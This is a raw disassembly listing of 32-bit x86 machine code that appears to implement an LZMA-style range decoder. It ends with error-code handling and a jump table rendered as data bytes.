  40729e:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4072a2:	0f 84 98 03 00 00    	je     0x407640
  4072a8:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4072ab:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4072ae:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4072b2:	0f b6 09             	movzbl (%ecx),%ecx
  4072b5:	ff 4d 94             	decl   -0x6c(%ebp)
  4072b8:	c1 e0 08             	shl    $0x8,%eax
  4072bb:	0b c1                	or     %ecx,%eax
  4072bd:	ff 45 90             	incl   -0x70(%ebp)
  4072c0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4072c3:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4072c6:	ff 4d b8             	decl   -0x48(%ebp)
  4072c9:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  4072cd:	7e 27                	jle    0x4072f6
  4072cf:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4072d2:	03 db                	add    %ebx,%ebx
  4072d4:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  4072d7:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  4072da:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4072dd:	72 0c                	jb     0x4072eb
  4072df:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4072e2:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4072e5:	83 cb 01             	or     $0x1,%ebx
  4072e8:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4072eb:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4072f2:	73 d2                	jae    0x4072c6
  4072f4:	eb a8                	jmp    0x40729e
  4072f6:	c1 e3 04             	shl    $0x4,%ebx
  4072f9:	03 c3                	add    %ebx,%eax
  4072fb:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  407302:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  407305:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407308:	05 44 06 00 00       	add    $0x644,%eax
  40730d:	33 db                	xor    %ebx,%ebx
  40730f:	89 45 a8             	mov    %eax,-0x58(%ebp)
  407312:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  407319:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40731c:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  40731f:	eb 28                	jmp    0x407349
  407321:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407325:	0f 84 21 03 00 00    	je     0x40764c
  40732b:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40732e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407331:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407335:	0f b6 09             	movzbl (%ecx),%ecx
  407338:	ff 4d 94             	decl   -0x6c(%ebp)
  40733b:	c1 e0 08             	shl    $0x8,%eax
  40733e:	0b c1                	or     %ecx,%eax
  407340:	ff 45 90             	incl   -0x70(%ebp)
  407343:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407346:	ff 45 b8             	incl   -0x48(%ebp)
  407349:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40734c:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  40734f:	7d 72                	jge    0x4073c3
  407351:	8b 45 b0             	mov    -0x50(%ebp),%eax
  407354:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407357:	c1 ea 0b             	shr    $0xb,%edx
  40735a:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  40735d:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407360:	8d 34 07             	lea    (%edi,%eax,1),%esi
  407363:	89 75 ac             	mov    %esi,-0x54(%ebp)
  407366:	66 8b 06             	mov    (%esi),%ax
  407369:	0f b7 c8             	movzwl %ax,%ecx
  40736c:	0f af d1             	imul   %ecx,%edx
  40736f:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  407372:	73 17                	jae    0x40738b
  407374:	89 55 f0             	mov    %edx,-0x10(%ebp)
  407377:	ba 00 08 00 00       	mov    $0x800,%edx
  40737c:	2b d1                	sub    %ecx,%edx
  40737e:	c1 fa 05             	sar    $0x5,%edx
  407381:	03 d0                	add    %eax,%edx
  407383:	d1 65 b0             	shll   $1,-0x50(%ebp)
  407386:	66 89 16             	mov    %dx,(%esi)
  407389:	eb 2a                	jmp    0x4073b5
  40738b:	33 c9                	xor    %ecx,%ecx
  40738d:	29 55 f0             	sub    %edx,-0x10(%ebp)
  407390:	41                   	inc    %ecx
  407391:	29 55 f4             	sub    %edx,-0xc(%ebp)
  407394:	8b d9                	mov    %ecx,%ebx
  407396:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  407399:	d3 e3                	shl    %cl,%ebx
  40739b:	8b cb                	mov    %ebx,%ecx
  40739d:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  4073a0:	0b d9                	or     %ecx,%ebx
  4073a2:	66 8b c8             	mov    %ax,%cx
  4073a5:	66 c1 e9 05          	shr    $0x5,%cx
  4073a9:	2b c1                	sub    %ecx,%eax
  4073ab:	47                   	inc    %edi
  4073ac:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4073af:	66 89 06             	mov    %ax,(%esi)
  4073b2:	89 7d b0             	mov    %edi,-0x50(%ebp)
  4073b5:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4073bc:	73 88                	jae    0x407346
  4073be:	e9 5e ff ff ff       	jmp    0x407321
  4073c3:	01 5d d4             	add    %ebx,-0x2c(%ebp)
  4073c6:	ff 45 d4             	incl   -0x2c(%ebp)
  4073c9:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4073cc:	85 c0                	test   %eax,%eax
  4073ce:	0f 84 84 02 00 00    	je     0x407658
  4073d4:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  4073d7:	0f 87 b8 02 00 00    	ja     0x407695
  4073dd:	83 45 d0 02          	addl   $0x2,-0x30(%ebp)
  4073e1:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4073e4:	01 45 a0             	add    %eax,-0x60(%ebp)
  4073e7:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  4073eb:	0f 84 6d 02 00 00    	je     0x40765e
  4073f1:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4073f4:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  4073f7:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  4073fa:	72 03                	jb     0x4073ff
  4073fc:	03 45 8c             	add    -0x74(%ebp),%eax
  4073ff:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407402:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  407405:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407408:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  40740b:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  40740e:	40                   	inc    %eax
  40740f:	33 d2                	xor    %edx,%edx
  407411:	f7 75 8c             	divl   -0x74(%ebp)
  407414:	8b 45 98             	mov    -0x68(%ebp),%eax
  407417:	ff 45 98             	incl   -0x68(%ebp)
  40741a:	ff 4d 9c             	decl   -0x64(%ebp)
  40741d:	ff 4d d0             	decl   -0x30(%ebp)
  407420:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  407424:	88 08                	mov    %cl,(%eax)
  407426:	89 55 ec             	mov    %edx,-0x14(%ebp)
  407429:	7f bc                	jg     0x4073e7
  40742b:	e9 78 fd ff ff       	jmp    0x4071a8
  407430:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407434:	75 20                	jne    0x407456
  407436:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  407439:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  40743d:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  407440:	c1 e0 04             	shl    $0x4,%eax
  407443:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  407447:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40744a:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  407451:	e9 ce 00 00 00       	jmp    0x407524
  407456:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407459:	c7 85 7c ff ff ff 13 	movl   $0x13,-0x84(%ebp)
  407460:	00 00 00 
  407463:	8d 70 02             	lea    0x2(%eax),%esi
  407466:	89 75 ac             	mov    %esi,-0x54(%ebp)
  407469:	66 8b 06             	mov    (%esi),%ax
  40746c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40746f:	0f b7 d0             	movzwl %ax,%edx
  407472:	c1 e9 0b             	shr    $0xb,%ecx
  407475:	0f af ca             	imul   %edx,%ecx
  407478:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  40747b:	73 18                	jae    0x407495
  40747d:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407480:	b9 00 08 00 00       	mov    $0x800,%ecx
  407485:	2b ca                	sub    %edx,%ecx
  407487:	c1 f9 05             	sar    $0x5,%ecx
  40748a:	03 c8                	add    %eax,%ecx
  40748c:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  407490:	66 89 0e             	mov    %cx,(%esi)
  407493:	eb 19                	jmp    0x4074ae
  407495:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  407498:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  40749b:	66 8b c8             	mov    %ax,%cx
  40749e:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  4074a5:	66 c1 e9 05          	shr    $0x5,%cx
  4074a9:	2b c1                	sub    %ecx,%eax
  4074ab:	66 89 06             	mov    %ax,(%esi)
  4074ae:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4074b5:	73 25                	jae    0x4074dc
  4074b7:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4074bb:	0f 84 a9 01 00 00    	je     0x40766a
  4074c1:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4074c4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4074c7:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4074cb:	0f b6 09             	movzbl (%ecx),%ecx
  4074ce:	ff 4d 94             	decl   -0x6c(%ebp)
  4074d1:	c1 e0 08             	shl    $0x8,%eax
  4074d4:	0b c1                	or     %ecx,%eax
  4074d6:	ff 45 90             	incl   -0x70(%ebp)
  4074d9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4074dc:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  4074e2:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  4074e8:	e9 91 f7 ff ff       	jmp    0x406c7e
  4074ed:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4074f1:	75 1c                	jne    0x40750f
  4074f3:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  4074f6:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4074f9:	c1 e0 04             	shl    $0x4,%eax
  4074fc:	c7 45 d0 08 00 00 00 	movl   $0x8,-0x30(%ebp)
  407503:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  40750a:	e9 38 ff ff ff       	jmp    0x407447
  40750f:	81 45 a8 04 02 00 00 	addl   $0x204,-0x58(%ebp)
  407516:	c7 45 d0 10 00 00 00 	movl   $0x10,-0x30(%ebp)
  40751d:	c7 45 c0 08 00 00 00 	movl   $0x8,-0x40(%ebp)
  407524:	c7 45 84 14 00 00 00 	movl   $0x14,-0x7c(%ebp)
  40752b:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40752e:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  407535:	89 45 b8             	mov    %eax,-0x48(%ebp)
  407538:	eb 28                	jmp    0x407562
  40753a:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40753e:	0f 84 32 01 00 00    	je     0x407676
  407544:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  407547:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40754a:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  40754e:	0f b6 09             	movzbl (%ecx),%ecx
  407551:	ff 4d 94             	decl   -0x6c(%ebp)
  407554:	c1 e0 08             	shl    $0x8,%eax
  407557:	0b c1                	or     %ecx,%eax
  407559:	ff 45 90             	incl   -0x70(%ebp)
  40755c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40755f:	ff 4d b8             	decl   -0x48(%ebp)
  407562:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  407566:	7e 5e                	jle    0x4075c6
  407568:	8b 45 b0             	mov    -0x50(%ebp),%eax
  40756b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40756e:	c1 e9 0b             	shr    $0xb,%ecx
  407571:	8d 14 00             	lea    (%eax,%eax,1),%edx
  407574:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407577:	8d 34 02             	lea    (%edx,%eax,1),%esi
  40757a:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40757d:	66 8b 06             	mov    (%esi),%ax
  407580:	0f b7 f8             	movzwl %ax,%edi
  407583:	0f af cf             	imul   %edi,%ecx
  407586:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  407589:	73 17                	jae    0x4075a2
  40758b:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40758e:	b9 00 08 00 00       	mov    $0x800,%ecx
  407593:	2b cf                	sub    %edi,%ecx
  407595:	c1 f9 05             	sar    $0x5,%ecx
  407598:	03 c8                	add    %eax,%ecx
  40759a:	d1 65 b0             	shll   $1,-0x50(%ebp)
  40759d:	66 89 0e             	mov    %cx,(%esi)
  4075a0:	eb 16                	jmp    0x4075b8
  4075a2:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  4075a5:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4075a8:	66 8b c8             	mov    %ax,%cx
  4075ab:	66 c1 e9 05          	shr    $0x5,%cx
  4075af:	2b c1                	sub    %ecx,%eax
  4075b1:	42                   	inc    %edx
  4075b2:	66 89 06             	mov    %ax,(%esi)
  4075b5:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4075b8:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4075bf:	73 9e                	jae    0x40755f
  4075c1:	e9 74 ff ff ff       	jmp    0x40753a
  4075c6:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  4075c9:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  4075cc:	33 c0                	xor    %eax,%eax
  4075ce:	40                   	inc    %eax
  4075cf:	d3 e0                	shl    %cl,%eax
  4075d1:	2b d8                	sub    %eax,%ebx
  4075d3:	8b 45 84             	mov    -0x7c(%ebp),%eax
  4075d6:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4075d9:	e9 04 ff ff ff       	jmp    0x4074e2
  4075de:	01 5d d0             	add    %ebx,-0x30(%ebp)
  4075e1:	8b 45 80             	mov    -0x80(%ebp),%eax
  4075e4:	e9 f9 fe ff ff       	jmp    0x4074e2
  4075e9:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  4075f0:	00 00 00 
  4075f3:	e9 88 00 00 00       	jmp    0x407680
  4075f8:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  4075ff:	00 00 00 
  407602:	eb 7c                	jmp    0x407680
  407604:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  40760b:	00 00 00 
  40760e:	eb 70                	jmp    0x407680
  407610:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  407617:	00 00 00 
  40761a:	eb 64                	jmp    0x407680
  40761c:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  407623:	00 00 00 
  407626:	eb 58                	jmp    0x407680
  407628:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  40762f:	00 00 00 
  407632:	eb 4c                	jmp    0x407680
  407634:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  40763b:	00 00 00 
  40763e:	eb 40                	jmp    0x407680
  407640:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  407647:	00 00 00 
  40764a:	eb 34                	jmp    0x407680
  40764c:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  407653:	00 00 00 
  407656:	eb 28                	jmp    0x407680
  407658:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  40765c:	eb 22                	jmp    0x407680
  40765e:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  407665:	00 00 00 
  407668:	eb 16                	jmp    0x407680
  40766a:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  407671:	00 00 00 
  407674:	eb 0a                	jmp    0x407680
  407676:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  40767d:	00 00 00 
  407680:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  407686:	6a 22                	push   $0x22
  407688:	59                   	pop    %ecx
  407689:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  40768f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407691:	33 c0                	xor    %eax,%eax
  407693:	eb 03                	jmp    0x407698
  407695:	83 c8 ff             	or     $0xffffffff,%eax
  407698:	5f                   	pop    %edi
  407699:	5e                   	pop    %esi
  40769a:	5b                   	pop    %ebx
  40769b:	c9                   	leave
  40769c:	c3                   	ret
  40769d:	94                   	xchg   %eax,%esp
  40769e:	6c                   	insb   (%dx),%es:(%edi)
  40769f:	40                   	inc    %eax
  4076a0:	00 39                	add    %bh,(%ecx)
  4076a2:	6d                   	insl   (%dx),%es:(%edi)
  4076a3:	40                   	inc    %eax
  4076a4:	00 d4                	add    %dl,%ah
  4076a6:	6d                   	insl   (%dx),%es:(%edi)
  4076a7:	40                   	inc    %eax
  4076a8:	00 a9 6d 40 00 69    	add    %ch,0x6900406d(%ecx)
  4076ae:	74 40                	je     0x4076f0
  4076b0:	00 b7 74 40 00 fa    	add    %dh,-0x5ffbf8c(%edi)
  4076b6:	6d                   	insl   (%dx),%es:(%edi)
  4076b7:	40                   	inc    %eax
  4076b8:	00 99 70 40 00 03    	add    %bl,0x3004070(%ecx)
  4076be:	71 40                	jno    0x407700
  4076c0:	00 46 71             	add    %al,0x71(%esi)
  4076c3:	40                   	inc    %eax
  4076c4:	00 b7 71 40 00 de    	add    %dh,-0x21ffbf8f(%edi)
  4076ca:	71 40                	jno    0x40770c
  4076cc:	00 9e 72 40 00 93    	add    %bl,-0x6cffbf8e(%esi)
  4076d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4076d3:	40                   	inc    %eax
  4076d4:	00 4c 6f 40          	add    %cl,0x40(%edi,%ebp,2)
  4076d8:	00 10                	add    %dl,(%eax)
  4076da:	70 40                	jo     0x40771c
  4076dc:	00 21                	add    %ah,(%ecx)
  4076de:	73 40                	jae    0x407720
  4076e0:	00 f1                	add    %dh,%cl
  4076e2:	70 40                	jo     0x407724
  4076e4:	00 30                	add    %dh,(%eax)
  4076e6:	74 40                	je     0x407728
  4076e8:	00 ed                	add    %ch,%ch
  4076ea:	74 40                	je     0x40772c
  4076ec:	00 de                	add    %bl,%dh
  4076ee:	75 40                	jne    0x407730
  4076f0:	00 18                	add    %bl,(%eax)
  4076f2:	72 40                	jb     0x407734
  4076f4:	00 2f                	add    %ch,(%edi)
  4076f6:	72 40                	jb     0x407738
  4076f8:	00 2b                	add    %ch,(%ebx)
  4076fa:	75 40                	jne    0x40773c
  4076fc:	00 3a                	add    %bh,(%edx)
  4076fe:	75 40                	jne    0x407740
  407700:	00 5d 72             	add    %bl,0x72(%ebp)
  407703:	40                   	inc    %eax
  407704:	00 df                	add    %bl,%bh
  407706:	6f                   	outsl  %ds:(%esi),(%dx)
  407707:	40                   	inc    %eax
  407708:	00 6a 71             	add    %ch,0x71(%edx)
  40770b:	40                   	inc    %eax
  40770c:	00 e7                	add    %ah,%bh
  40770e:	73 40                	jae    0x407750
	...
